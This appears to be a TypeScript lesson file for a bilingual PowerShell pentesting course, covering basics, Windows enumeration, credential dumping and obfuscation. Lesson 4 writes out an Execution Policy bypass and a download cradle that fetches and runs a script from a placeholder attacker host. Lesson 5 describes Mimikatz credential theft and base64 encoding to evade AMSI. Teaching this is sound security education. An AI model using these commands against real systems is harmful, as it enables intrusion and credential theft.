// ── academy/powershell-lessons.ts ──────────────────────────────────
// Subsección PowerShell del path Scripting para pentesting.
// 5 clases: qué es → variables/condiciones → bucles/funciones →
// pentesting I (enumeración de Windows) → pentesting II (credenciales y
// ofuscación). Sin labId: el terminal del lab es Linux; el alumno
// practica los conceptos y los comandos se muestran como ejemplos.

import type { Lesson } from '../types';

export const POWERSHELL_LESSONS: Lesson[] = [
  {
    id: 'powershell-01',
    pathId: 'scripting',
    order: 1,
    title: 'What is PowerShell: objects, not text',
    titleEs: 'Qué es PowerShell: objetos, no texto',
    readingMinutes: 8,
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Dentro de un Windows, el lenguaje con el que se mueven los atacantes es PowerShell. Es la shell oficial del sistema y, a diferencia de bash, su pipeline no pasa texto: pasa objetos.',
            en: "Inside a Windows box, the language attackers move with is PowerShell. It's the system's official shell and, unlike bash, its pipeline does not pass text: it passes objects.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/ps01-objects-pipeline.mp4',
        durationSec: 63,
        caption: 'PowerShell passes objects, not text: Verb-Noun cmdlets, the pipeline, .ps1 scripts and the Execution Policy bypass.',
        captionEs: 'PowerShell pasa objetos, no texto: cmdlets Verbo-Sustantivo, el pipeline, scripts .ps1 y el bypass de Execution Policy.',
      },
      {
        type: 'content',
        title: 'Shell + language, with objects',
        titleEs: 'Shell + lenguaje, con objetos',
        body: 'PowerShell is a shell and a scripting language. Its commands are called **cmdlets** and follow the pattern Verb-Noun: `Get-Process`, `Get-Service`, `Set-Item`. The pipeline `|` passes **objects**, not text: `Get-Process | Sort-Object CPU -Descending` sorts the process objects by their CPU property. You filter with `Where-Object`, you pick fields with `Select-Object`.',
        bodyEs: 'PowerShell es una shell y un lenguaje de scripting. Sus comandos se llaman **cmdlets** y siguen el patrón Verbo-Sustantivo: `Get-Process`, `Get-Service`, `Set-Item`. El pipeline `|` pasa **objetos**, no texto: `Get-Process | Sort-Object CPU -Descending` ordena los objetos de procesos por su propiedad CPU. Filtrás con `Where-Object`, elegís campos con `Select-Object`.',
      },
      {
        type: 'content',
        title: 'First steps and scripts',
        titleEs: 'Primeros pasos y scripts',
        body: '`Get-Command` lists the cmdlets, `Get-Help Get-Process` explains one. Scripts are `.ps1` files run with `.\script.ps1`. Windows blocks scripts by default (Execution Policy); you bypass it per-run with `powershell -ep bypass -File script.ps1`. You will see that flag constantly in pentest guides — it is the first thing attackers use.',
        bodyEs: '`Get-Command` lista los cmdlets, `Get-Help Get-Process` explica uno. Los scripts son archivos `.ps1` que se corren con `.\script.ps1`. Windows bloquea los scripts por defecto (Execution Policy); lo salteás por ejecución con `powershell -ep bypass -File script.ps1`. Vas a ver ese flag constantemente en guías de pentest — es lo primero que usan los atacantes.',
      },
      {
        type: 'terminal-demo',
        command: 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 5 Name, CPU',
        output: 'Name              CPU\n----              ---\nsvchost          1234.56\nchrome           987.12\npowershell       456.78\nfirefox          345.90\nmsedge           234.56',
        explanation: 'Three cmdlets in one pipeline: get all processes, sort by CPU descending, keep the top 5 with two properties. In bash you would parse text; here you manipulate objects directly.',
        explanationEs: 'Tres cmdlets en un pipeline: traé todos los procesos, ordená por CPU descendente, quedate con los 5 primeros con dos propiedades. En bash parsearías texto; acá manipulás objetos directamente.',
      },
      {
        type: 'quiz',
        question: 'What does the PowerShell pipeline pass between commands?',
        questionEs: '¿Qué pasa por el pipeline de PowerShell entre comandos?',
        options: [
          { es: 'Texto plano', en: 'Plain text' },
          { es: 'Objetos con propiedades', en: 'Objects with properties' },
          { es: 'Archivos binarios', en: 'Binary files' },
          { es: 'Solo números', en: 'Only numbers' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'powershell-02',
    pathId: 'scripting',
    order: 2,
    title: 'Basics: variables, arrays and conditions',
    titleEs: 'Bases: variables, arrays y condiciones',
    readingMinutes: 9,
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Las variables en PowerShell se escriben con $ adelante — se nota que nació pensando en la consola. Con arrays, hashtables y condiciones armás la lógica de tus scripts.',
            en: "Variables in PowerShell are written with a leading $ — you can tell it was born thinking about the console. With arrays, hashtables and conditions you build your scripts' logic.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/ps02-variables-conditionals.mp4',
        durationSec: 62,
        caption: 'Variables with $, arrays, hashtables and conditions with word operators like -eq and -match.',
        captionEs: 'Variables con $, arrays, hashtables y condiciones con operadores palabra como -eq y -match.',
      },
      {
        type: 'content',
        title: 'Variables, arrays and hashtables',
        titleEs: 'Variables, arrays y hashtables',
        body: '`$nombre = "kali"` — variables always start with `$`. Arrays: `@(22, 80, 443)` or `$puertos = 22..80`. Hashtables (key-value): `$servidor = @{ ip = "10.0.0.11"; puerto = 445 }` and you read `$servidor.ip`. You build strings with `"$nombre en $($servidor.ip)"`.',
        bodyEs: '`$nombre = "kali"` — las variables siempre arrancan con `$`. Arrays: `@(22, 80, 443)` o `$puertos = 22..80`. Hashtables (clave-valor): `$servidor = @{ ip = "10.0.0.11"; puerto = 445 }` y leés `$servidor.ip`. Armás strings con `"$nombre en $($servidor.ip)"`.',
      },
      {
        type: 'content',
        title: 'Conditions',
        titleEs: 'Condiciones',
        body: '`if ($puerto -eq 445) { "SMB!" } elseif ($puerto -eq 3389) { "RDP!" } else { "otro" }`. PowerShell operators are word-like: `-eq` (equal), `-ne` (not equal), `-gt` `-lt` (greater/less), `-and` `-or`. For text: `-match` uses regex, `-like` uses wildcards (`$name -like "*admin*"`).',
        bodyEs: '`if ($puerto -eq 445) { "SMB!" } elseif ($puerto -eq 3389) { "RDP!" } else { "otro" }`. Los operadores de PowerShell son tipo palabra: `-eq` (igual), `-ne` (distinto), `-gt` `-lt` (mayor/menor), `-and` `-or`. Para texto: `-match` usa regex, `-like` usa comodines (`$name -like "*admin*"`).',
      },
      {
        type: 'terminal-demo',
        command: '$objetivo = "10.0.0.11"\n$puertos = @(21, 22, 445)\nforeach ($p in $puertos) {\n  if ($p -eq 445) { "SMB en $objetivo" } else { "puerto $p" }\n}',
        output: 'puerto 21\npuerto 22\nSMB en 10.0.0.11',
        explanation: 'Variables, an array and a condition working together. The script walks the port list and flags the interesting one — the beginning of a port-based decision logic.',
        explanationEs: 'Variables, un array y una condición trabajando juntos. El script recorre la lista de puertos y marca el interesante — el comienzo de una lógica de decisión por puertos.',
      },
      {
        type: 'quiz',
        question: 'Which operator checks if two values are NOT equal in PowerShell?',
        questionEs: '¿Qué operador verifica que dos valores NO sean iguales en PowerShell?',
        options: [
          { es: '!=', en: '!=' },
          { es: '-ne', en: '-ne' },
          { es: '-not', en: '-not' },
          { es: '<>', en: '<>' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'powershell-03',
    pathId: 'scripting',
    order: 3,
    title: 'Loops, functions and useful cmdlets',
    titleEs: 'Bucles, funciones y cmdlets útiles',
    readingMinutes: 9,
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Con bucles, funciones y un puñado de cmdlets, ya podés automatizar casi cualquier tarea de administración — y de ataque. Acá van las piezas que más vas a usar.',
            en: "With loops, functions and a handful of cmdlets, you can automate almost any administration task — and attack. Here are the pieces you'll use the most.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/ps03-loops-cmdlets.mp4',
        durationSec: 61,
        caption: 'Loops, functions and the cmdlets you will use the most: $_, Where-Object, ForEach-Object and the I/O ones.',
        captionEs: 'Bucles, funciones y los cmdlets que más vas a usar: $_, Where-Object, ForEach-Object y los de I/O.',
      },
      {
        type: 'content',
        title: 'Loops',
        titleEs: 'Bucles',
        body: '`foreach ($p in $lista) { ... }` iterates a collection. `Get-Process | ForEach-Object { $_.Name }` — `$_` is the current object in the pipeline. `for ($i=1; $i -le 254; $i++) { ... }` for numeric ranges. `while ($condicion) { ... }` while a condition holds.',
        bodyEs: '`foreach ($p in $lista) { ... }` itera una colección. `Get-Process | ForEach-Object { $_.Name }` — `$_` es el objeto actual del pipeline. `for ($i=1; $i -le 254; $i++) { ... }` para rangos numéricos. `while ($condicion) { ... }` mientras se cumpla una condición.',
      },
      {
        type: 'content',
        title: 'Functions and I/O cmdlets',
        titleEs: 'Funciones y cmdlets de I/O',
        body: '`function Escanear { param($host) nmap ... }` groups logic with typed parameters. `Get-Content archivo.txt` reads a file, `Out-File` writes it, `Add-Content` appends. `Invoke-WebRequest http://...` (alias `iwr`) does HTTP requests. `ConvertTo-Json` / `ConvertFrom-Json` serialize objects — perfect for talking to APIs.',
        bodyEs: '`function Escanear { param($host) nmap ... }` agrupa lógica con parámetros tipados. `Get-Content archivo.txt` lee un archivo, `Out-File` lo escribe, `Add-Content` agrega. `Invoke-WebRequest http://...` (alias `iwr`) hace peticiones HTTP. `ConvertTo-Json` / `ConvertFrom-Json` serializan objetos — perfecto para hablar con APIs.',
      },
      {
        type: 'terminal-demo',
        command: 'Get-Service | Where-Object { $_.Status -eq "Running" } | ForEach-Object { $_.Name }',
        output: 'Dnscache\nLanmanServer\nSpooler\nWinRM',
        explanation: 'Pipeline with three stages: get all services, filter the running ones, print only their names. $_ is each service object. Note how WinRM appears — a classic target.',
        explanationEs: 'Pipeline de tres etapas: traé todos los servicios, filtrá los que están corriendo, imprimí solo sus nombres. $_ es cada objeto de servicio. Fijate que aparece WinRM — un objetivo clásico.',
      },
      {
        type: 'quiz',
        question: 'In a pipeline like Get-Service | ForEach-Object { ... }, what does $_ represent?',
        questionEs: 'En un pipeline como Get-Service | ForEach-Object { ... }, ¿qué representa $_?',
        options: [
          { es: 'El script completo', en: 'The whole script' },
          { es: 'El objeto actual del pipeline', en: 'The current object in the pipeline' },
          { es: 'El primer objeto', en: 'The first object' },
          { es: 'El último objeto', en: 'The last object' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'powershell-04',
    pathId: 'scripting',
    order: 4,
    title: 'Pentesting I: Windows enumeration',
    titleEs: 'Pentesting I: enumeración de Windows',
    readingMinutes: 10,
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'Cuando aterrizás en un Windows, PowerShell es tu navaja suiza para enumerar: procesos, servicios, usuarios, permisos. Todo lo que un Linux enumera con comandos, acá se hace con cmdlets.',
            en: "When you land on a Windows box, PowerShell is your Swiss army knife to enumerate: processes, services, users, permissions. Everything you enumerate in Linux with commands, here is done with cmdlets.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/ps04-windows-enumeration.mp4',
        durationSec: 59,
        caption: 'Your Swiss army knife on Windows: whoami /priv, Get-Process, net localgroup and the registry. SeDebugPrivilege is gold.',
        captionEs: 'Tu navaja suiza en Windows: whoami /priv, Get-Process, net localgroup y el registro. SeDebugPrivilege es oro.',
      },
      {
        type: 'content',
        title: 'Local enumeration',
        titleEs: 'Enumeración local',
        body: '`whoami /priv` — your privileges (SeDebugPrivilege is gold). `Get-Process` — running processes, `Get-Service` — services (some run as SYSTEM). `Get-ChildItem -Recurse -Force C:\\Users` — hunt files. `net user` lists accounts, `net localgroup Administrators` shows the admins. And `Get-ItemProperty HKLM:\\...` reads the Registry.',
        bodyEs: '`whoami /priv` — tus privilegios (SeDebugPrivilege es oro). `Get-Process` — procesos corriendo, `Get-Service` — servicios (algunos corren como SYSTEM). `Get-ChildItem -Recurse -Force C:\\Users` — a cazar archivos. `net user` lista cuentas, `net localgroup Administrators` muestra los admins. Y `Get-ItemProperty HKLM:\\...` lee el registro.',
      },
      {
        type: 'content',
        title: 'Running your scripts on a target',
        titleEs: 'Ejecutar tus scripts en un objetivo',
        body: 'The Execution Policy blocks scripts; bypass it: `powershell -ep bypass -File enum.ps1`. And when you have remote code execution but no shell, use a download cradle: `IEX(New-Object Net.WebClient).DownloadString("http://TU-IP/script.ps1")` — downloads and executes in memory, without touching disk. That is the pattern of almost every PS payload.',
        bodyEs: 'La Execution Policy bloquea los scripts; saltéala: `powershell -ep bypass -File enum.ps1`. Y cuando tenés ejecución remota pero no shell, usá un download cradle: `IEX(New-Object Net.WebClient).DownloadString("http://TU-IP/script.ps1")` — descarga y ejecuta en memoria, sin tocar disco. Ese es el patrón de casi todo payload de PS.',
      },
      {
        type: 'terminal-demo',
        command: 'whoami /priv\nnet localgroup Administrators',
        output: 'PRIVILEGES INFORMATION\n----------------------\nSeDebugPrivilege      Enable        SeDebugPrivilege\nSeChangeNotifyPrivilege Enabled\n\nAlias name     Administrators\nMembers\n-----------------------------------------------\nAdministrator\nCORP\\pablo',
        explanation: 'Two enumeration lines: your privileges and the local admins. SeDebugPrivilege enabled means you can potentially inject into other processes — one step from SYSTEM.',
        explanationEs: 'Dos líneas de enumeración: tus privilegios y los admins locales. SeDebugPrivilege habilitado significa que potencialmente podés inyectarte en otros procesos — a un paso de SYSTEM.',
      },
      {
        type: 'quiz',
        question: 'What does the download cradle IEX(New-Object Net.WebClient).DownloadString(...) do?',
        questionEs: '¿Qué hace el download cradle IEX(New-Object Net.WebClient).DownloadString(...)?',
        options: [
          { es: 'Guarda un archivo en disco', en: 'Saves a file to disk' },
          { es: 'Descarga y ejecuta un script en memoria', en: 'Downloads and executes a script in memory' },
          { es: 'Borra los logs', en: 'Deletes the logs' },
          { es: 'Cifra el disco', en: 'Encrypts the disk' },
        ],
        correctIndex: 1,
      },
    ],
  },
  {
    id: 'powershell-05',
    pathId: 'scripting',
    order: 5,
    title: 'Pentesting II: credentials, obfuscation and exfiltration',
    titleEs: 'Pentesting II: credenciales, ofuscación y exfiltración',
    readingMinutes: 10,
    steps: [
      {
        type: 'foxy-narrator',
        messages: [
          {
            es: 'PowerShell es el lenguaje favorito en post-explotación de Windows por una razón: toca todo lo que hay que tocar — memoria, credenciales, red. Y también es el más vigilado. Acá ves el porqué y el cómo lo esconden.',
            en: "PowerShell is the favorite language in Windows post-exploitation for a reason: it touches everything worth touching — memory, credentials, network. And it's also the most watched. Here's the why and how attackers hide it.",
          },
        ],
      },
      {
        type: 'video',
        src: '/videos/ps05-credentials-obfuscation.mp4',
        durationSec: 61,
        caption: 'Credentials live in LSASS: Mimikatz dumps them, and base64 obfuscation with -EncodedCommand slips past the filters.',
        captionEs: 'Las credenciales viven en LSASS: Mimikatz las vuelca y la ofuscación base64 con -EncodedCommand esquiva los filtros.',
      },
      {
        type: 'content',
        title: 'Credentials: where they live in memory',
        titleEs: 'Credenciales: dónde viven en memoria',
        body: 'Windows keeps credentials in memory inside the `LSASS` process. Tools like Mimikatz (and its PowerShell port `Invoke-Mimikatz`) dump those credentials: plaintext passwords, hashes and Kerberos tickets. Today AV and EDR detect Mimikatz quickly — modern attacks use variants like `Rubeus` or `Sekurlsa` alternatives. The concept stays: **the credentials of a Windows session are loot sitting in memory.**',
        bodyEs: 'Windows guarda credenciales en memoria dentro del proceso `LSASS`. Herramientas como Mimikatz (y su puerto PowerShell `Invoke-Mimikatz`) vuelcan esas credenciales: contraseñas en claro, hashes y tickets Kerberos. Hoy AV y EDR detectan a Mimikatz rápido — los ataques modernos usan variantes como Rubeus o alternativas a Sekurlsa. El concepto sigue: **las credenciales de una sesión Windows son botín en memoria.**',
      },
      {
        type: 'content',
        title: 'Obfuscation and AMSI',
        titleEs: 'Ofuscación y AMSI',
        body: 'Windows scans every PS script before running it via AMSI (Anti-Malware Scan Interface). To dodge it, attackers obfuscate: encode payloads in base64, split strings, hide cmdlet names. Example: `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))` encodes a command; on the target you decode it with `-EncodedCommand`. Defenders counter-attack with logging: `ScriptBlock Logging` records every PS command — which is why quiet attackers use unmanaged tools.',
        bodyEs: 'Windows escanea cada script de PS antes de correrlo con AMSI (Interfaz de Escaneo Anti-Malware). Para esquivarlo, los atacantes ofuscan: encodear payloads en base64, partir strings, esconder nombres de cmdlets. Ejemplo: `[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))` encodea un comando; en el objetivo lo decodificás con `-EncodedCommand`. Los defensores contraatacan con logging: el `ScriptBlock Logging` registra cada comando de PS — por eso los atacantes silenciosos usan herramientas no administradas.',
      },
      {
        type: 'terminal-demo',
        command: '$cmd = "whoami"\n$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\necho $enc\n# en el objetivo:\npowershell -EncodedCommand $enc',
        output: 'dwBoAG8AYQBtAGkA\n# (decodificado en el objetivo)\ncorp\\pablo',
        explanation: 'A command encoded in base64 and executed via -EncodedCommand. The output shows the user. This pattern hides the command from casual log readers and some filters.',
        explanationEs: 'Un comando encodeado en base64 y ejecutado vía -EncodedCommand. La salida muestra el usuario. Este patrón esconde el comando de los lectores casuales de logs y de algunos filtros.',
      },
      {
        type: 'quiz',
        question: 'What does AMSI do in Windows?',
        questionEs: '¿Qué hace AMSI en Windows?',
        options: [
          { es: 'Cifra el disco', en: 'Encrypts the disk' },
          { es: 'Escanea los scripts de PowerShell antes de ejecutarlos', en: 'Scans PowerShell scripts before they run' },
          { es: 'Bloquea el puerto 445', en: 'Blocks port 445' },
          { es: 'Guarda las contraseñas', en: 'Stores the passwords' },
        ],
        correctIndex: 1,
      },
    ],
  },
];
